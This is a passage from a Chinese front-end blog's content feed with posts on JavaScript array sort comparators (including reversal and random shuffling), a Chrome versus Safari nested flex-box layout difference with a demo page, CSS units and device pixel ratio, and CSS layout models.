class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// 1 2</span><span class="token comment">// 4 1</span><span class="token comment">// 3 4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以发现，由于这里的比较函数没有返回值，所以对数组就没有排序操作，而每一次遍历中，第二个参数 <code>b</code> 对应前一个元素，第一个参数 <code>a</code> 对应后一个元素；当然该函数的具体排序方法就不得而知并且因 JS 引擎而异了；</p><h2 id="升序"><a href="#升序" class="headerlink" title="升序"></a>升序</h2><p>对数组按照升序方式排序，即小的元素排在前面，大的元素排在后面，假设比较函数当前遍历的元素对为 <code>(2, 1)</code>，则 <code>a = 1, b = 2</code>，要想升序就要 <code>a</code> 排到 <code>b</code> 的前面，对应上面的规则，就是需要比较函数的返回值小于 0，由于当前 <code>a - b &lt; 0</code>；所以直接返回一个 <code>a - b</code> 就行了，代码如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">]</span>arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> a <span class="token operator">-</span> b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// [1, 2, 3, 11, 11, 12]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>针对上面的代码再来分析下，在每一次遍历比较的两个元素中：</p><ul><li>如果后一个元素比前一个元素小，即 <code>a - b &lt; 0</code>，按照规则就是 <code>a</code> 要排到 <code>b</code> 的前面，也就是这两个元素会交换，小的在前，大的在后；</li><li>如果后一个元素比前一个元素大，即 <code>a - b &gt; 0</code>，按照规则就是 <code>b</code> 要排到 <code>a</code> 的前面，由于 <code>b</code> 本来就在 <code>a</code> 的前面，所以两元素位置不变；</li><li>如果后一个元素与前一个元素相同，即 <code>a - b = 0</code>，按照规则就是 <code>a</code> 和 <code>b</code> 的位置不变，两元素位置同样不变；</li></ul><p>最后，数组就变成升序的了；</p><h2 id="降序"><a href="#降序" class="headerlink" title="降序"></a>降序</h2><p>原理和升序类似，只是思路反过来了，代码如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">]</span>arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> b <span class="token operator">-</span> a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// [12, 11, 11, 3, 2, 1]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样来分析一下，每一次遍历中：</p><ul><li>如果前一个元素比后一个元素小，即 <code>b - a &lt; 0</code>，按照规则就是 <code>a</code> 要排到 <code>b</code> 的前面，也就是这两个元素会交换，大的在前，小的在后；</li><li>如果前一个元素比后一个元素大，即 <code>b - a &gt; 0</code>，按照规则就是 <code>b</code> 要排到 <code>a</code> 的前面，由于 <code>b</code> 本来就在 <code>a</code> 的前面，所以两元素位置不变；</li><li>如果前一个元素与后一个元素相同，即 <code>b - a = 0</code>，按照规则就是 <code>a</code> 和 <code>b</code> 的位置不变，两元素位置同样不变；</li></ul><p>最后，数组也就变成降序了；</p><h2 id="反序"><a href="#反序" class="headerlink" title="反序"></a>反序</h2><p>这是排序函数一个另一个应用，作用相当于 <code>.reverse()</code> 函数，即让数组中的元素顺序颠倒，实现也很简单，就是利用规则，让每次比较函数的返回值小于 0 就行了，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// [3, 4, 1, 2]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="乱序"><a href="#乱序" class="headerlink" title="乱序"></a>乱序</h2><p>这也算是一个比较实用的用途了，即将数组中元素的位置和顺序打乱，增加随机性，实现也简单，即利用规则，让比较函数的返回值随机为 <code>&gt; 0, &lt; 0, = 0</code> 这三种情况之一，使得元素是否交换位置具有随机性，也就实现了顺序的打乱，实现代码如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token number">0.5</span> <span class="token operator">-</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// [4, 3, 2, 1, 5]</span>arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token number">0.5</span> <span class="token operator">-</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// [5, 3, 1, 2, 4]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数组 排序 乱序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS flex 盒子在 Chrome 和 Safari 中的行为差异</title>
      <link href="/2024/09/27/css/css-flex-he-zi-zai-chrome-he-safari-zhong-de-xing-wei-chai-yi/"/>
      <url>/2024/09/27/css/css-flex-he-zi-zai-chrome-he-safari-zhong-de-xing-wei-chai-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最近的开发中有遇到一个页面样式的兼容性问题，大致是使用 <code>flex</code> 布局的两个嵌套弹性盒子，在 <strong>Chrome</strong> 和 <strong>Safari</strong> 中对一些特殊情况的处理行为不一致，从而产生了测试 bug；</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>下面将问题简化为了一个 <strong>demo</strong> 模型，一个定高 <code>300px</code> 的 <code>flex</code> 盒子 A（红色边框），嵌套了另一个高度被子元素（绿色块）撑开的 <code>flex</code> 盒子 B（蓝色边框），其中盒子 B 为垂直伸缩 <code>flex-direction: column;</code>，Footer 元素（绿色边框）高度固定 <code>100px</code>，背景半透明；代码：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">            <span class="token selector">.flex-box-a</span> <span class="token punctuation">&#123;</span>                <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>                <span class="token property">width</span><span class="token punctuation">:</span> 300px<span class="token punctuation">;</span>                <span class="token property">height</span><span class="token punctuation">:</span> 300px<span class="token punctuation">;</span>                <span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span>                <span class="token property">border</span><span class="token punctuation">:</span> 2px solid red<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token selector">.flex-box-b</span> <span class="token punctuation">&#123;</span>                <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>                <span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>                <span class="token property">height</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>                <span class="token property">border</span><span class="token punctuation">:</span> 2px solid blue<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token selector">.inner-green-box</span> <span class="token punctuation">&#123;</span>                <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>                <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>                <span class="token property">background</span><span class="token punctuation">:</span> green<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token selector">.inner-aqua-box</span> <span class="token punctuation">&#123;</span>                <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>                <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>                <span class="token property">background</span><span class="token punctuation">:</span> aqua<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token selector">.footer-box</span> <span class="token punctuation">&#123;</span>                <span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>                <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>                <span class="token property">border</span><span class="token punctuation">:</span> 2px solid lime<span class="token punctuation">;</span>                <span class="token property">background</span><span class="token punctuation">:</span> skyblue<span class="token punctuation">;</span>                <span class="token property">opacity</span><span class="token punctuation">:</span> .5<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token selector">.bottom-brown-box</span> <span class="token punctuation">&#123;</span>                <span class="token property">width</span><span class="token punctuation">:</span> 304px<span class="token punctuation">;</span>                <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>                <span class="token property">color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>                <span class="token property">background</span><span class="token punctuation">:</span> burlywood<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        Flex Box A - height: 300px;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex-box-a<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            Flex Box B - height: auto;            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex-box-b<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner-green-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>height: 100px;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner-aqua-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Footer - height: 100px;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bottom-brown-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            height: 100px;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果：</p><p><img src="https://img-blog.csdnimg.cn/20210705143709768.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tOSUdIX1lVTg==,size_16,color_FFFFFF,t_70#pic_center" alt="1"></p><p>然后增加绿色块子元素的高度，可以发现在 <strong>Chrome</strong> 中 <code>flex</code> 盒子 B 的高度会被该子元素撑开，Footer 元素高度被压缩，而 <strong>Safari</strong> 中的盒子 B 的高度并没有被子元素撑开，而是超出部分被隐藏在了 Footer 下层，同时 Footer 元素也被少量压缩：</p><p><img src="https://img-blog.csdnimg.cn/20210705143709805.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tOSUdIX1lVTg==,size_16,color_FFFFFF,t_70#pic_center" alt="2"></p><p>当绿色块子元素高度超过最外层 <code>flex</code> 盒子 A 的高度时，<strong>Chrome</strong> 中的内层 <code>flex</code> 盒子 B 继续被撑开，Footer 元素直接脱离外层 <code>flex</code> 盒子，而 <strong>Safari</strong> 中只有子元素超出外层 <code>flex</code> 盒子，Footer 依然只被少量压缩：</p><p><img src="https://img-blog.csdnimg.cn/20210705143709771.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tOSUdIX1lVTg==,size_16,color_FFFFFF,t_70#pic_center" alt="3"></p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>最终解决问题的方式是放开外层 <code>flex</code> 盒子 A 的<strong>高度限制</strong>，这样无论在 <strong>Chrome</strong> 还是 <strong>Safari</strong> 中 <code>flex</code> 盒子都能被自由撑开，行为表现一致：</p><p><img src="https://img-blog.csdnimg.cn/20210705143709810.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tOSUdIX1lVTg==,size_16,color_FFFFFF,t_70#pic_center" alt="4"></p><p>因此开发中遇到类似<strong>定高</strong>与<strong>弹性</strong>并存的情况，需要合理设计布局，避免不必要的兼容问题；</p>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flex box chrome safari </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS 单位与尺寸参数</title>
      <link href="/2024/09/27/css/css-dan-wei-yu-chi-cun-can-shu/"/>
      <url>/2024/09/27/css/css-dan-wei-yu-chi-cun-can-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="css单位"><a href="#css单位" class="headerlink" title="css单位"></a>css单位</h1><h2 id="px"><a href="#px" class="headerlink" title="px"></a>px</h2><p>常用的单位，即像素pixel缩写，但通常被当做绝对单位，但严格说并不是，因为官方考虑到观看不同设备显示屏时，使网页设计出的某一图形的显示大小在人眼中的观看效果差不多，而定义的一个相对值，即人以一臂之遥观看96DPI的显示屏的角度，大概就是利用透视的近大远小原理，照顾不同设备的最终观看效果。</p><p>比如某网页图形设置为一固定的px值，在手机浏览器上显示是用直尺测大概1cm，但是同样在不缩放情况下，电脑显示屏测量可能就是1.5cm左右，如果是打印机打印出来的话也许就是2cm左右了。</p><h2 id="em"><a href="#em" class="headerlink" title="em"></a>em</h2><p>常用的相对单位，前面的数字是比例，即相对于<strong>父元素</strong>的字体尺寸的比例，比如父元素字体16px，子元素设置1em，也可以理解为100%，那么子元素也是16px，同样，2em就是200%，32px，也可以是小数0.2em，1.5em等等。</p><h2 id="rem"><a href="#rem" class="headerlink" title="rem"></a>rem</h2><p>类似于em，但rem是相对于<strong>根元素html</strong>，例如用css标签选择器给html标签设置字体尺寸font-size大小为20px，那么文档中的每个1rem就代表20px，1.5em代表30px，以此类推。</p><h2 id="in，cm，mm"><a href="#in，cm，mm" class="headerlink" title="in，cm，mm"></a>in，cm，mm</h2><p>这些虽然是生活中的物体测量单位，但网页的1cm尺寸的元素显示到显示器上，用直尺测量通常不是标准1cm，因为css已经默认设置1in=96px，前面也讲过px会因显示屏而不同，因此最终尺寸也不是绝对的，其他也差不多，所以这类尺寸很少用。</p><p>尺寸比较：</p><p><img src="https://i.loli.net/2019/01/26/5c4c2fdf10206.png" alt="size"></p><h1 id="显示原理"><a href="#显示原理" class="headerlink" title="显示原理"></a>显示原理</h1><h2 id="dpi-ppi"><a href="#dpi-ppi" class="headerlink" title="dpi, ppi"></a>dpi, ppi</h2><p>dpi(dot per inch)，即每英寸多少点，是针对打印机的一个概念，点可以理解为墨点；</p><p>ppi(pixel per inch)，即每英寸多少像素，是针对显示器的概念，开发中一般关心显示器问题，所以一般认为<code>dpi</code>和<code>ppi</code>是同一个概念；</p><h2 id="dpr"><a href="#dpr" class="headerlink" title="dpr"></a>dpr</h2><p>dpr(device pixel ratio)，即物理像素与独立像素的比例；</p><ul><li>物理像素</li></ul><p><strong>物理像素</strong>也叫<strong>设备像素</strong>，屏幕显示图像都是由很多个像素点组成，屏幕出厂时本身带的点阵数就是它的物理像素；</p><ul><li>独立像素</li></ul><p>而<strong>独立像素</strong>，又叫<strong>逻辑像素</strong>，或者<strong>css像素</strong>，顾名思义，逻辑嘛，当然是独立于物理的概念，大小没有固定实际值，也是前面提到的css里面的<code>1px</code>；</p><p>逻辑像素可以通过js代码获取，<code>screen.width</code>获取逻辑像素宽度，<code>screen.height</code>是高度；至于<code>dpr</code>，可以通过<code>devicePixelRatio</code>这个全局属性获取，现在的新一些的安卓智能手机一般这个比例是<strong>3</strong>，电脑的一般是<strong>1</strong>，iphone、iPad一般是<strong>2</strong>；</p><p><strong>注意</strong>，dpr为<strong>1</strong>，说明一个css像素块由<code>1x1</code>个物理像素块来显示，也就是一个物理像素，如果为<strong>2</strong>，则是一个css像素由<code>2x2</code>个物理像素来显示，也就是<strong>4</strong>个像素块，以此类推；这里也就能明白了，dpr的存在就是为了是小尺寸设备屏幕显示出高画质图形，细节更高就更清晰了；</p><p>现在来说设备像素的获取，并没有直接的获取方法，所以可以通过<strong>dpr乘以逻辑像素的方法获取</strong>；</p><p>综合举例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> logicWidth <span class="token operator">=</span> screen<span class="token punctuation">.</span>width<span class="token punctuation">;</span><span class="token keyword">var</span> logicHeight <span class="token operator">=</span> screen<span class="token punctuation">.</span>height<span class="token punctuation">;</span><span class="token keyword">var</span> dpr <span class="token operator">=</span> devicePixelRatio<span class="token punctuation">;</span><span class="token keyword">var</span> deviceWidth <span class="token operator">=</span> logicWidth <span class="token operator">*</span> dpr<span class="token punctuation">;</span><span class="token keyword">var</span> deviceHeight <span class="token operator">=</span> logicHeight <span class="token operator">*</span> dpr<span class="token punctuation">;</span><span class="token comment">// 输出逻辑像素</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'逻辑像素：'</span> <span class="token operator">+</span> logicWidth <span class="token operator">+</span> <span class="token string">'x'</span> <span class="token operator">+</span> logicHeight<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 输出设备像素</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'物理像素：'</span> <span class="token operator">+</span> deviceWidth <span class="token operator">+</span> <span class="token string">'x'</span> <span class="token operator">+</span> deviceHeight<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css单位 px dpi dpr 逻辑像素 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS 布局模型详细介绍</title>
      <link href="/2024/09/27/css/css-bu-ju-mo-xing-xiang-xi-jie-shao/"/>
      <url>/2024/09/27/css/css-bu-ju-mo-xing-xiang-xi-jie-shao/</url>
      
        <content type="html"><![CDATA[<p>HTML中元素有三种布局模型：流动模型、浮动模型、层模型。</p><h1 id="流动模型（flow）"><a href="#流动模型（flow）" class="headerlink" title="流动模型（flow）"></a>流动模型（flow）</h1><p>HTML网页默认布局就是流动模型，布局如下：</p><p><strong>块级元素(block)**自上而下垂直分布，因为块级元素默认宽度为浏览器窗口的</strong>100%<strong>，或者理解为每个块级元素默认</strong>占一行**。常见块级元素有 <code>div</code>, <code>p</code>, <code>h</code> 等；</p><p>**内联元素(inline)**从左到右水平分布，即不像块级元素那样每个独占一行。常见内联元素有 <code>a</code>, <code>span</code>, <code>em</code> 等。</p><h1 id="浮动模型（float）"><a href="#浮动模型（float）" class="headerlink" title="浮动模型（float）"></a>浮动模型（float）</h1><p>上面提到的块级元素是每个独占一行显示，但是定义css浮动模型后就能使两个块级元素<strong>并排一行</strong>显示。<br>例如HTML代码：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>div1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>div2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>World !<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显示结果是这样：</p><pre><code>HelloWorld !</code></pre><p>但是设置浮动css后：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span><span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>效果就是这样：</p><pre><code>HelloWorld !</code></pre><p>也可以设置元素一左一右显示：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">#div1</span> <span class="token punctuation">&#123;</span><span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">#div2</span> <span class="token punctuation">&#123;</span><span class="token property">float</span><span class="token punctuation">:</span> right<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="层模型（layer）（position）"><a href="#层模型（layer）（position）" class="headerlink" title="层模型（layer）（position）"></a>层模型（layer）（position）</h1><p>类似于PS中的<strong>图层</strong>编辑，HTML中也存在层模型布局，对元素进行<strong>定位</strong>。<br>层模型有三种：<strong>绝对定位</strong>(absolute)、<strong>相对定位</strong>(relative)、<strong>固定定位</strong>(fixed)。</p><h2 id="绝对定位"><a href="#绝对定位" class="headerlink" title="绝对定位"></a>绝对定位</h2><p>理解就是字面上的意思，简言之就是<strong>相对于上级设置了 position 属性的元素</strong>进行定位，如果没有这类上级就是相对于 <code>body</code> 标签，也是<strong>浏览器窗口</strong>。需要设置css：<code>position: absolute;</code>，然后就可以使用 <code>top</code>, <code>right</code>, <code>bottom</code>, <code>left</code> 这类属性进行定位。例如：</p><pre class="line-numbers 